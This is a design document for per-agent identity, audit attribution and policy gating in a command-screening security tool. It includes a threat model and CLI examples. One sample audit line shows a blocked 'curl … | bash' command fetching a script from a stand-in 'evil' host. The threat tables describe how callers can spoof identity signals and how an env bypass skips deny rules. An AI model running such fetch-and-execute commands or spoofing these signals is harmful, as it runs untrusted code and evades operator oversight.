# Agent Governance — Design

This document is the **design spike** for Milestone 4 item 8 of the tirith
roadmap (*"Agent governance — per-agent identity + policy"*). It is the first
artifact of that work; it lands **before** any enforcement code. Subsequent
chunks (CLI surface, policy schema, per-agent gating) build on the decisions
recorded here.

**Status:**
* Chunk 1 (observability scaffolding) — **shipped**.
* Chunk 2 (CLI surface + `agent_rules` policy schema, observation-only) —
  **shipped** (see §5).
* Chunk 3 (per-agent verdict gating, bypass-path origin stamp, shared YAML
  helper consolidation) — **shipped** (see §5 and §6).

The companion code through chunk 2 was observation-only:

- `crates/tirith-core/src/agent_origin.rs` — the [`AgentOrigin`](#3-the-agentorigin-type)
  type and the CLI-side environment resolver.
- `crates/tirith-core/src/verdict.rs` — `Verdict.agent_origin: Option<AgentOrigin>`.
- `crates/tirith-core/src/audit.rs` — `AuditEntry.agent_origin: Option<AgentOrigin>`,
  populated from `Verdict.agent_origin` by `log_verdict_with_raw`.
- `crates/tirith-core/src/mcp/origin.rs` — per-MCP-session origin store,
  populated by the dispatcher from `initialize.clientInfo`.
- `crates/tirith/src/cli/check.rs`, `paste.rs`, `gateway.rs` — populate
  the origin on the verdict before it reaches the audit layer.

Chunk 3 turns observation into enforcement:

- `crates/tirith-core/src/escalation.rs` — `apply_agent_rules` and the
  splice into `post_process_verdict`.
- `crates/tirith-core/src/verdict.rs` — new `RuleId::AgentDeniedByPolicy`
  variant, wired through `scoring.rs`, `build.rs`'s `EXPECTED_RULES`,
  `golden_fixtures.rs`'s `ALL_RULE_IDS` + `EXTERNALLY_TRIGGERED_RULES`,
  and `assets/data/rule_explanations.toml`.
- `crates/tirith-core/src/engine.rs` — bypass-path audit removed (the
  caller now owns the single audit write site) so `agent_origin` reaches
  the audit log on bypassed BLOCKs.
- `crates/tirith/src/cli/yaml.rs` — new shared module hosting
  `yaml_safe_scalar` / `yaml_safe_inline_comment` / `YAML_NEEDS_QUOTING_BYTES`;
  `cli/mcp.rs` and `cli/agent.rs` are thin importers.

## 1. Threat model & motivation

### What we are trying to do

When tirith records "this command was blocked", an operator looking at the
audit log wants to know *who* tried it: a human at a terminal, an AI coding
agent that called tirith from a hook, an MCP client connected to the
`tirith mcp-server`, a CI runner inside a GitHub Action, or the gateway in
front of a chat UI. Today every verdict looks the same — the audit entry
records a session ID and an `integration` field that is only populated for
shell-hook telemetry, never for the verdict itself.

Recording the caller's *category* (and, where the caller honestly
self-identifies, its name) is the precondition for two later capabilities:

1. **Per-agent policy** — chunk 2+: gate a verdict differently when the caller
   is an MCP client, or when `TIRITH_INTEGRATION=claude-code` is set, or when
   we're in CI. This is the substance of "agent governance" — but it is
   pointless to design that policy surface until we know what the signal
   actually looks like in production.
2. **Per-agent observability** — already in scope here: an operator running
   `tirith warnings --since=24h` can see which classes of caller produced
   which findings, even without any policy gate.

### What we are not doing in chunk 1 (or chunk 2)

Chunks 1 and 2 are both observation-only. There is **no** policy enforcement
decision driven by `AgentOrigin`. No `Verdict.action` is changed by origin.
No new `RuleId` is added. **Chunk 2 adds `agent_rules` to the policy schema
and a pure `agent_decision` helper, but the engine never consults that
helper** — chunk 3 wires it. We add a field to `Verdict` and `AuditEntry`
— both serde-default-on-parse so old log entries still load — and populate
it from the CLI / MCP / gateway paths.

The reason: tirith's honesty discipline. An attribution signal that nobody
has used in production is brittle. We add the signal, observe what real
values look like (a `TIRITH_INTEGRATION` set by a hook nobody upstreamed yet;
an MCP `client_info` from a client we haven't seen before; a CI provider env
shape an obscure runner uses), and *then* design enforcement against a real
sample set.

### What we explicitly do **not** claim

- **Not adversary-resistant.** Every signal feeding `AgentOrigin` is set by a
  process running as the user — `TIRITH_INTEGRATION`, `GITHUB_ACTIONS`, MCP
  `clientInfo.name`, `is_terminal()`. An attacker who already executes code
  as that user can fake any of these. We make this honest in the API surface
  (variant doc-comments say "caller-claimed, not verified") and the threat
  model (this document).
- **Not a replacement for OS-level sandboxing.** Origin records what an honest
  caller looked like. It is not a sandbox boundary; tirith never claimed one.
- **Not load-bearing for security policy alone.** Future chunks may add per-
  origin gating but the policy author must understand the signal is operator-
  trust, not adversary-resistant — exactly the same trust class as
  `TIRITH=0` (which the operator can disable for non-interactive shells, but
  cannot prevent an in-process attacker from setting).

### What an honest threat picture looks like

| Threat | Tirith's posture today | What changes in chunk 1 |
|---|---|---|
| Attacker sets `TIRITH_INTEGRATION=trusted-agent` to escape a future agent policy | Possible — env is operator-trust | No change. Chunk 1 records the value; chunk 2+ must layer enforcement that does NOT trust this alone (e.g. corroborate with a cryptographic capability) |
| Attacker sets `clientInfo.name="Claude Code"` to spoof an MCP client | Possible — payload is caller-claimed | No change. We sanitize the string and cap its length so a hostile value cannot poison the audit log line, but we do not verify the claim |
| Attacker sets `CI=true` to dodge an interactive prompt | Possible — already true today (`is_terminal()` is also operator-trust) | No change. Origin records `Ci` when CI signals fire; nothing chunk 1 does newly trusts this |
| Operator audits "which commands ran from agent A vs agent B" | Today impossible — no signal recorded | New: audit entries now carry `agent_origin` |

### Why a closed enum

The variant set is small and meaningful: `Human`, `Agent`, `Mcp`, `Gateway`,
`Ci`, `Ide`. A future variant requires a source change — a hostile or
mistaken caller cannot smuggle a fabricated category through a free-form
string. The *payload* strings inside the variants (`tool`, `client_name`,
`provider`, `name`) **are** free-form (a new MCP client tirith has never
seen reports its own name); they are sanitized, length-capped, and never
themselves drive policy.

## 2. Origin sources

The signals tirith reads honestly *today*, and how they compose. The
table is the actual implementation, not a wish list.

| Signal | Set by | Trust class | Variant produced |
|---|---|---|---|
| `TIRITH_INTEGRATION` env var | The hook the upstream agent installed (e.g. `claude-code`, `cursor`, `vscode`) | Caller (operator-trust) | `Agent { tool, version? }` |
| `TIRITH_INTEGRATION_VERSION` env var | Companion to `TIRITH_INTEGRATION` — optional, not yet emitted by any hook | Caller | populates the `version` slot on `Agent` |
| MCP `initialize.clientInfo` | The MCP client connecting to `tirith mcp-server` | Caller (caller-claimed) | `Mcp { client_name, client_version? }` |
| Gateway path (built-in) | The fact that `tirith gateway` is the process running | Built-in (tirith chose this code path) | `Gateway` |
| CI provider env (`GITHUB_ACTIONS`, `BUILDKITE`, `CIRCLECI`, …) | The CI runner | Caller (env is operator-trust) | `Ci { provider }` |
| Generic `CI` env | Any CI-aware tool | Caller | `Ci { provider: None }` |
| `is_terminal(stderr)` + `TIRITH_INTERACTIVE` | The shell / OS — caller-fakeable | Caller | `Human { interactive }` |

**Priority on the CLI path** (first match wins; implemented in
`resolve_cli_origin`):

1. `TIRITH_INTEGRATION` is non-empty → `Agent`.
2. A named CI provider env is set → `Ci { provider: Some(...) }`.
3. Generic `CI` env is truthy → `Ci { provider: None }`.
4. Otherwise → `Human { interactive }`.

**Priority on the MCP path** (implemented in `mcp/origin.rs`):

- The dispatcher captures `client_info` once at `initialize` time and writes
  it to a process-scoped store. Every subsequent tool call reads it.
- If `client_info` is absent (some MCP implementations omit it), the origin
  records `Mcp { client_name: "unknown-mcp-client" }` — still "this came
  from MCP", just anonymous. Falling back to `Human` would be misleading.

**Gateway path**: hard-coded — when `tirith gateway` produces a verdict, the
origin is `AgentOrigin::Gateway`. The gateway already knows it is the
gateway; it does not need a self-report.

**Hook telemetry**: `log_hook_event` (the `"hook_telemetry"` entry type)
already carries an `integration` field. Chunk 1 leaves `agent_origin: None`
on hook telemetry entries — they are not verdicts, and synthesizing an
`Agent` variant from the `integration` would conflate event types. Chunk
2+ may emit a synthetic origin on hook events from a known agent
integration; the design slot is open.

### Signal hygiene

Every caller-supplied string passes through `sanitize_caller_label` or
`sanitize_caller_version`:

- Trim ASCII whitespace.
- Drop ASCII control bytes (`< 0x20`, `0x7F`) and Unicode invisible / format
  / surrogate codepoints (bidi, zero-width, Unicode tags, variation
  selectors). These are the same classes tirith's byte-scan rules already
  flag in command input — re-emitting them through the agent label would
  defeat the byte-scan.
- Cap at `MAX_LABEL_LEN` (256 bytes) / `MAX_VERSION_LEN` (64 bytes), with
  char-boundary truncation so a multibyte UTF-8 sequence is never sliced.

Sanitization is intentionally non-destructive of *normal* values:
`claude-code`, `cursor`, `Claude Code`, `1.2.3-rc.4` all pass through
unchanged.

## 3. The `AgentOrigin` type

```rust
pub enum AgentOrigin {
    Human { interactive: bool },
    Agent { tool: String, version: Option<String> },
    Mcp { client_name: String, client_version: Option<String> },
    Gateway,
    Ci { provider: Option<String> },
    Ide { name: String },
}
```

Tagged-union serialization (`{"kind": "...", ...}`):

```json
{"kind":"human","interactive":true}
{"kind":"agent","tool":"claude-code","version":"1.2.3"}
{"kind":"mcp","client_name":"Cursor","client_version":"0.42"}
{"kind":"gateway"}
{"kind":"ci","provider":"github-actions"}
{"kind":"ci"}
{"kind":"ide","name":"vscode"}
```

A field omitted on serialization stays omitted (not `null`) — we use
`#[serde(skip_serializing_if = "Option::is_none")]`. Old JSON without an
`agent_origin` field still parses cleanly (`Verdict` / `AuditEntry` / the
aggregator's `AuditRecord` all use `#[serde(default)]` on the field).

### Per-variant trust

| Variant | Produced by | An operator should treat this as | An attacker can produce this by |
|---|---|---|---|
| `Human { interactive }` | CLI fallback when no other signal fires | "best guess that a person ran tirith" | unsetting `TIRITH_INTEGRATION` and `CI*` envs |
| `Agent { tool, version }` | `TIRITH_INTEGRATION` env from the upstream hook | "the caller self-identifies as this tool" — useful for filtering, not for trust | setting `TIRITH_INTEGRATION` to anything |
| `Mcp { client_name, client_version }` | MCP `initialize.clientInfo` | "the MCP client says it is this" — useful for filtering | sending arbitrary `clientInfo` over JSON-RPC |
| `Gateway` | `tirith gateway` process path | "tirith was the policy enforcement point for an upstream consumer" — trustable that the code path ran | impossible — built-in |
| `Ci { provider }` | provider env vars or generic `CI` | "the runner says it is CI" — useful for filtering | setting `GITHUB_ACTIONS=true` |
| `Ide { name }` | (reserved — chunk 2+) | (not used today) | (n/a) |

### Why `Ide` ships unused

`Ide` is reserved. IDE integrations today set `TIRITH_INTEGRATION` and land
in `Agent`. If a future IDE provides a more reliable signal (a code-signed
plugin manifest, a control-pipe handshake), `Ide` is the slot for it. We
ship it now so the on-disk schema does not change when chunk 2+ uses it.

## 4. Plumbing

The path an origin takes through the analysis pipeline:

```
                      +-----------------------------+
                      | callsite knows its identity |
                      +-----------------------------+
                                  |
                                  v
        +----------------------------------------------------+
        | tirith check / paste:                              |
        |   origin = resolve_cli_origin(interactive)         |
        |   raw_verdict.agent_origin = Some(origin)          |
        |                                                    |
        | tirith mcp-server tool:                            |
        |   raw_verdict.agent_origin = mcp::origin::current()|
        |                                                    |
        | tirith gateway:                                    |
        |   raw_verdict.agent_origin = Some(Gateway)         |
        +----------------------------------------------------+
                                  |
                                  v
                +--------------------------------+
                | post_process_verdict           |
                | clones agent_origin through    |
                | every transformation           |
                +--------------------------------+
                                  |
                                  v
                +--------------------------------+
                | log_verdict_with_raw           |
                | reads verdict.agent_origin     |
                | writes AuditEntry.agent_origin |
                +--------------------------------+
                                  |
                                  v
                +--------------------------------+
                | audit log (JSONL)              |
                | each verdict line carries      |
                | "agent_origin": { ... }        |
                +--------------------------------+
```

The engine itself (`engine::analyze`) does **not** know the caller's
identity. The callsite — the CLI subcommand, the MCP tool handler, the
gateway request handler — sets the origin on the verdict it received. This
is the same pattern existing fields like `policy_path_used` and
`interactive_detected` use: engine emits, caller annotates.

`post_process_verdict` already clones the entire `Verdict` and threads it
through escalation / paranoia / approval — the new field rides along with
no extra work.

`log_verdict_with_raw` reads `verdict.agent_origin` and writes the audit
entry's `agent_origin` field. Old callers that pre-date the field continue
to work: the verdict's `agent_origin` defaults to `None`, the audit entry's
`agent_origin` is then `None`, and `#[serde(skip_serializing_if =
"Option::is_none")]` keeps the field out of the JSON line.

## 5. CLI surface (shipped in chunk 2; enforcement wired in chunk 3)

The roadmap names four commands. **Chunk 2 ships all four** plus the
matching `agent_rules` policy schema. **Chunk 3 wires enforcement**:
`post_process_verdict` now consults `policy::agent_decision` against
the verdict's `agent_origin` and forces the action to `Block` (with a
fresh `RuleId::AgentDeniedByPolicy` finding) on a `deny` match. The
chunk-2 safeguard test `agent_rules_chunk2_loading_changes_no_verdict`
was retired in chunk 3; the replacement tests in
`crates/tirith-core/src/escalation.rs::tests` pin the four behavioral
arms:

* `agent_rules_deny_forces_block_on_allow_verdict`
* `agent_rules_deny_keeps_block_on_already_blocked_verdict`
* `agent_rules_allow_does_not_bypass_block`
* `agent_rules_unspecified_leaves_verdict_unchanged`
* `agent_rules_unset_does_not_introduce_finding` (the regression guard)

### `tirith agent sessions`

Lists per-origin counts from the audit log. Output:

```text
$ tirith agent sessions
tirith agent sessions: 685 verdict(s) across 5 origin group(s) in /Users/me/.local/share/tirith/log.jsonl.

  agent ("claude-code")                    count=412  allow=380  warn=20  block=12  last=2026-05-22T14:30:00+00:00
  mcp ("Cursor")                            count=188  allow=170  warn=15  block=3   last=2026-05-22T14:28:00+00:00
  human (interactive)                      count=73   allow=70   warn=3   block=0   last=2026-05-22T13:55:00+00:00
  ci ("github-actions")                    count=12   allow=12   warn=0   block=0   last=2026-05-22T09:00:00+00:00
  unknown                                   count=0    allow=0    warn=0   block=0   last=-
```

* **Pure read** from `~/.local/share/tirith/log.jsonl` (override with
  `--log <path>`). Off the detection hot path; touches no network.
* **Honest unattributed bucket** — entries without an `agent_origin`
  (pre-chunk-1 lines, hook telemetry routed in error, and any future
  analysis-then-audit path that does not yet stamp origin) land in
  `"unknown"` rather than being silently dropped.
* **Hook telemetry filtered out** — only `entry_type: "verdict"` rows
  contribute; hook events have their own `integration` field and are
  not verdicts by design.
* `--format json` emits a structured envelope (`schema_version`,
  `log_path`, `group_count`, `total_entries`, `groups`).
* **Exit codes**: `0` on success (including zero groups), `1` on a
  read or JSON-write failure.

### `tirith agent explain <query>`

Drilldown on a session id or command substring. Matches `(a)` exact
session-id equality, `(b)` case-insensitive substring on the
redacted command, or `(c)` case-insensitive substring on the rendered
origin label so an operator can search for `"claude-code"`. Up to 20
matches surface, sorted newest-first.

```text
$ tirith agent explain claude-code
tirith agent explain: 3 match(es) for "claude-code" in /Users/me/.local/share/tirith/log.jsonl.

  2026-05-22T14:30:00+00:00  session=sess-abc123  origin=agent ("claude-code")  action=Block  rules=curl_pipe_shell
      command: "curl https://evil/get.sh | bash"
      policy: /repo/.tirith/policy.yaml
  ...
```

* `--format json` emits per-match structured detail (`agent_origin`,
  `rule_ids`, etc.).
* **Exit codes**: `0` on at least one match, `1` on no match / read
  failure / JSON-write failure.

### `tirith agent policy init`

Scaffolds `.tirith/agent-policy.yaml.example` from the audit log's
**observed** distinct origins. Mirrors `tirith mcp policy init`'s
convention: every entry is **commented out** so importing the example
into a working `policy.yaml` never silently widens trust — the
operator reviews and uncomments what they intend to declare.

* **Deterministic** — origins are sorted by `(kind, payload)`; two
  runs against the same audit log produce a byte-identical file.
* **Missing log is not fatal** — a header-only template is still
  written so the operator has a starting point.
* `--force` overwrites an existing example; without it, an existing
  example is preserved.
* `--format json` emits the structured scaffold for a CI integration
  to ingest.
* **Exit codes**: `0` on successful write, `1` on usage errors
  (existing file without `--force`, unreadable audit log, write
  failure).

### `tirith agent allow --kind <kind> [--tool <name>]`

Validates an `(kind, name?)` matcher and **prints the YAML snippet**
the operator pastes under `agent_rules.allow:`. **Does NOT mutate any
policy file** — the operator integrates the snippet themselves so an
honest review precedes any widening of trust (mirrors `tirith mcp
policy init`). The snippet is pasted into `.tirith/policy.yaml` (or
`.tirith/agent-policy.yaml.example`). The CLI flag is `--tool` (the
historical name); the YAML field it populates is `name` (the
post-chunk-3 schema field — neutral across the closed `kind` enum).

```text
$ tirith agent allow --kind agent --tool claude-code
tirith agent allow: valid matcher — paste the snippet below under `agent_rules.allow:` in your policy.
  (NOTE: `allow` is not a bypass — a verdict the engine already blocked stays blocked even when the caller is on the allow list. `deny` beats `allow`.)

    - kind: agent
      name: claude-code
```

Validation rules:
* `kind` must be `human` / `agent` / `mcp` / `gateway` / `ci` / `ide`.
* `--tool` on a payloadless kind (`human`, `gateway`) is rejected
  because it would match nothing.
* `--tool ""` is rejected (an empty payload can never match a real
  caller — `AgentOrigin` constructors reject it).
* **Exit codes**: `0` on a valid matcher, `1` on validation failure.

### Policy schema — `agent_rules`

Chunk 2 added the schema; **chunk 3 consumes it in
`post_process_verdict`**.

```yaml
agent_rules:
  allow:
    - kind: agent
      name: claude-code
    - kind: human
  deny:
    - kind: agent
      name: untrusted-tool
```

* `kind` is the [`AgentOriginKind`] discriminator (`human` / `agent`
  / `mcp` / `gateway` / `ci` / `ide`).
* `name` is the optional caller-claimed payload — the `tool` slot on
  `Agent`, the `client_name` on `Mcp`, the `provider` on `Ci`, or the
  `name` on `Ide`. The field is called `name` rather than `tool`
  because the payload means different things by kind; `name` is
  neutral across the closed enum. Case-sensitive exact match. A
  `name` filter on `human` / `gateway` is structurally meaningless:
  it is flagged by `tirith policy validate` as a warning (a slightly
  stale policy still loads — `policy validate` exits `0` unless a
  hard error fires) and rejected by `tirith agent allow` as a hard
  error (exit `1`) so the operator catches the mistake at scaffolding
  time.
* The pure helper `policy::agent_decision(&policy, &origin) ->
  AgentDecision` walks `deny` first (first match → `Denied { matcher }`)
  then `allow` (first match → `Allowed { matcher }`); no match →
  `Unspecified`. The matcher payload is what `apply_agent_rules` uses
  to name the matched rule in the injected finding.

#### Chunk-3 enforcement semantics

`crate::escalation::apply_agent_rules` consumes the helper inside
`post_process_verdict` after escalation and before warning recording:

| `agent_decision` returns | Effect on the verdict |
|---|---|
| `Denied { matcher }` | `action = Block`; a fresh `Finding { rule_id: RuleId::AgentDeniedByPolicy, severity: High, … }` is appended naming the matched origin (Debug-escaped), the matched matcher (kind + optional name payload, also Debug-escaped), and the policy file path. Existing detection findings are preserved. |
| `Allowed { matcher }` | No behavior change. `allow` is **not** a bypass — a verdict the engine already blocked stays blocked. |
| `Unspecified` | No behavior change. |
| (`verdict.agent_origin == None`) | Treated as `Unspecified` — an engine path that never set an origin has nothing to match against. |

**Chunk-3 minimal cut.** Richer matcher payloads — `severity` overrides
on `allow` (a trusted agent's Medium becomes Low), `approval_required:
true`, `fail_mode: closed` per-origin — are deferred to a future chunk
unless a live workload surfaces a concrete need. The minimal `Denied
→ Block` semantics covers the immediate operator use case ("block
this untrusted MCP client from running anything") without committing
the schema to questions we have not yet seen real telemetry for.

**Origin-stamp invariant.** Chunk 3 unified the model toward **exactly
one audit entry per caller path**, with `agent_origin` stamped on the
verdict **before** that call. `engine::analyze_inner` (reached through
`analyze_returning_policy`) **no longer audits** its own bypass fast-exit
— pre-chunk-3 it called `audit::log_verdict` with the unstamped verdict,
which on `tirith check` produced a double-log (engine entry → no origin;
CLI entry → with origin). Audit responsibility now lives entirely with
the caller. The per-file change set is:

* `cli/check.rs` — pre-chunk-3 this path already stamped origin and
  audited; chunk 3 deduplicated by removing the engine-side write.
* `cli/paste.rs` — stamping pre-chunk-3, but the bypass branch
  previously SKIPPED audit (trusting `analyze()` to have logged); it
  now audits the bypass branch explicitly so the entry carries origin.
* `mcp/tools.rs::call_check_command` — stamping pre-chunk-3, but the
  bypass branch previously skipped for the same reason; it now audits
  explicitly (same shape as `paste.rs`).
* `cli/install.rs` (both the package-manager and URL forms) and
  `cli/ecosystem.rs` — these analysis-then-audit paths now also stamp
  `agent_origin` via `resolve_cli_origin(interactive)` before
  `audit::log_verdict`, so an `install` or `ecosystem scan` audit line
  no longer lands in the `tirith agent sessions` "unknown" group.
* `cli/gateway.rs` — the request and notification handlers stamp
  `AgentOrigin::Gateway` on the in-memory raw verdict, and the local
  `AuditEntry<'a>` serialized to stderr now includes an `agent_origin`
  field (constant `AgentOrigin::Gateway`, since the gateway is the only
  emitter of that struct). Pre-chunk-3-follow-up the local entry shape
  lacked the field — the in-memory verdict carried origin, but the
  persisted stderr JSONL line did not.

**Known gap.** Origin attribution is best-effort and pin-fixed only at
the audit sites above. A new analysis-then-audit path added in future
work that calls `audit::log_verdict` without first setting
`verdict.agent_origin` will land its entries in the "unknown" group;
the audit aggregator (`tirith agent sessions`) is honest about this and
reports them rather than guessing. The four `golden_fixtures.rs`
safeguard tests do not cover this invariant — see the integration tests
`bypass_path_records_single_audit_entry_with_agent_origin`,
`install_audit_entry_carries_agent_origin`, and
`ecosystem_scan_audit_entry_carries_agent_origin` in
`crates/tirith/tests/cli_integration.rs`, plus
`cli::gateway::tests::test_audit_entry_serializes_valid_json` (which
pins the gateway's serialized `agent_origin: gateway` field) for the
per-site pins.

#### Known limitation: `TIRITH=0` bypass overrides `agent_rules.deny`

When the env-bypass policy (`allow_bypass_env` /
`allow_bypass_env_noninteractive`) honors a `TIRITH=0` invocation, the
bypass branch in `cli/check.rs`, `cli/gateway.rs`, and
`mcp/tools.rs::call_check_command` audits the raw verdict and skips
`post_process_verdict` — which means `apply_agent_rules` does not run,
and `agent_rules.deny` does not enforce. The bypass is consistent with
how `TIRITH=0` overrides every other detection, but operators writing
`agent_rules.deny` may reasonably expect `deny` to be more authoritative
than the user's interactive bypass. Surfaced as PR #120 wave-end review
finding A (silent-failure-hunter C1, pr-test-analyzer sev-8,
code-reviewer Important #2 — three-agent cross-corroboration).

Pinned by the regression test
`agent_rules_deny_skipped_under_tirith_bypass_today` in
`crates/tirith/tests/cli_integration.rs`. Revisit in M5 after operator
feedback — flipping the contract means running `apply_agent_rules` even
on the bypass branch at all three sites (`cli/check.rs`,
`cli/gateway.rs`, `mcp/tools.rs::call_check_command`) and updating the
existing bypass-contract pin
`bypass_path_records_single_audit_entry_with_agent_origin`.

## 6. Out of scope

### For chunk 1 (observation scaffolding)

- The `tirith agent ...` subcommands and the `agent_rules` policy schema
  — **shipped in chunk 2** (see §5).
- Any change to `TIRITH_INTEGRATION` semantics (it's already used by hooks;
  we read it, we don't redefine it).
- Synthesizing an origin onto hook telemetry entries. The `integration`
  field stays the hook telemetry's identifier; `agent_origin` stays `None`
  for `entry_type = "hook_telemetry"`. Chunk 3 may revisit.
- A signed / cryptographically-attested agent identity. That belongs with
  the broader supply-chain work in M5.

### For chunk 2 (CLI surface + policy schema)

- **Policy enforcement.** Resolved in chunk 3.
- **Mutating an existing policy file.** `tirith agent allow` still
  only prints the YAML snippet to paste; it does NOT append to
  `.tirith/policy.yaml`. The operator integrates it themselves, the
  same as with `tirith mcp policy init`'s example file. Chunk 3 did
  not change this discipline.
- **Normalizing caller-claimed strings.** Q2 stays open; case-sensitive
  exact matching remains the contract through chunk 3.
- **Fixing the engine's bypass-path double-log.** Resolved in chunk 3
  — the engine no longer audits its own bypass fast-exit; the CLI /
  MCP / gateway callers are the single audit site and stamp
  `agent_origin` before logging.

### For chunk 3 (per-agent verdict gating)

- **Richer matcher payloads.** `severity` overrides on `allow`,
  `approval_required: true`, per-origin `fail_mode` — all deferred. The
  chunk-3 contract is the minimal `Denied → Block` semantics; an
  `Allowed` matcher does not change verdict behavior beyond suppressing
  the chunk-3 deny check itself (and even then only because
  `agent_decision` returns `Allowed` before `Unspecified`).
- **Synthesizing an origin onto hook telemetry entries.** Still
  deferred (same reason as chunk 1's exclusion).
- **A signed / cryptographically-attested agent identity.** Still
  deferred to M5 supply-chain work. Chunk 3's enforcement layers on
  top of caller-claimed signals, with the same trust posture chunks 1
  and 2 documented.

## 7. Open questions / decisions deferred

These are the calls that need an explicit "yes / no" from you before chunk 2
starts. Chunk 1 does not depend on any of them.

### Q1. Should `AgentOrigin::Agent.tool` allow free-form names, or be a closed enum?

Current state: free-form (sanitized + length-capped string).

Pro free-form: a new agent integration ships its hook with
`TIRITH_INTEGRATION=newagent`; tirith records the name immediately, no
release coordination. The CLI surface (`tirith agent sessions`) shows it
on day one.

Pro closed enum: tirith doesn't accidentally trust an attacker's
`TIRITH_INTEGRATION=trusted-agent`; the enum is the allow-list.

My recommendation: keep free-form. Trust is the wrong axis to police via the
enum — the design already says `Agent` is caller-claimed. A future
`agent_policy.yaml` can opt-in to recognized names and gate everything
else; the enum doesn't need to.

### Q2. Should MCP `clientInfo.name` be normalized?

Current state: the string is sanitized but not normalized. `"Claude Code"`
and `"claude-code"` are distinct.

A normalization layer (lowercase, drop spaces) would let policy matching
write a single rule. But: an honest client sets exactly one of the two; we
don't yet know which. Chunk 1 records what the client sends; chunk 2 can
add a normalization step at policy match time without changing the recorded
audit data.

Recommendation: do not normalize in chunk 1; revisit at chunk 2 with a real
sample set.

### Q3. Should `Verdict.agent_origin` be `Option<AgentOrigin>` or default to `Human`?

Current state: `Option<AgentOrigin>`, default `None`.

`None` semantically means "this verdict's origin was never set by any
codepath" — which is honest for the engine fast-exit (the verdict is built
inside `engine::analyze` before any caller had a chance) and the bypass
path. Defaulting to `Human { interactive: false }` would imply we know
when in fact we don't.

Recommendation: keep `Option`. A downstream consumer that wants a default
can `verdict.agent_origin.unwrap_or(AgentOrigin::Human { interactive: false })`.

### Q4. CI heuristics — keep the small set, or grow it?

Current state: 11 named providers (`github-actions`, `gitlab-ci`,
`buildkite`, `circleci`, `jenkins`, `travis-ci`, `azure-pipelines`,
`bitbucket-pipelines`, `teamcity`, `drone-ci`, `aws-codebuild`) + generic
`CI`.

Adding a provider takes one line. Each entry is a *tag* tirith chooses
(lowercase-kebab), not the raw env name, so the tag is stable across
chunks; the env name on the left can come and go without breaking policy
written against the right.

Open question: do we want to ship more providers (Circle 2.0, Heroku CI,
Semaphore, …) in chunk 1, or wait until an operator asks? My
recommendation: wait. We have what the major providers set; the generic
`CI` fallback covers anything else honestly.

### Q5. Should `tirith doctor` show the resolved `AgentOrigin`?

Not yet. `doctor` is for *installation* state; origin is per-invocation. A
`tirith warnings --by-origin` or `tirith agent sessions` view in chunk 2
is the right surface. Adding it to `doctor` would conflate the two.

### Q6. Should we surface origin on the `tirith check` human output?

Not in chunk 1. Origin is captured for audit / aggregation, not for the
operator's "what did this command do?" view (which would be noisy on every
invocation). The `--format json` output of `check` already carries the
field (`agent_origin` is part of `Verdict`); the human output stays the
same.

If, after a few weeks of observing real telemetry, the answer changes —
e.g. an operator running a managed gateway wants every audited verdict to
also print `origin=gateway` so the upstream consumer's logs line up — we
add a `--show-origin` flag at that point.

---

*Chunk 1 shipped the design, the type, the field, and the populate-only
plumbing. Chunk 2 added the inspection surface — `tirith agent
sessions / explain / policy init / allow` — and the `agent_rules`
policy schema. **Chunk 3 wired enforcement**: the engine consults
`policy::agent_decision` through `escalation::apply_agent_rules` inside
`post_process_verdict`, a `deny` match forces the action to Block and
appends an `agent_denied_by_policy` finding, and `allow` is layered as
an explicit non-bypass. Enforcement is active on `tirith check`, the
gateway request/notification paths, and the MCP
`tools/call_check_command` handler today; `tirith paste`, `install`,
`ecosystem scan`, and the MCP `tools/call_check_url` /
`tools/call_check_paste` handlers stamp origin for audit but do not yet
route through `post_process_verdict` — a follow-up commit on this PR
extends enforcement to those surfaces. The interactive `TIRITH=0`
bypass also currently skips `apply_agent_rules`; revisit in M5.*
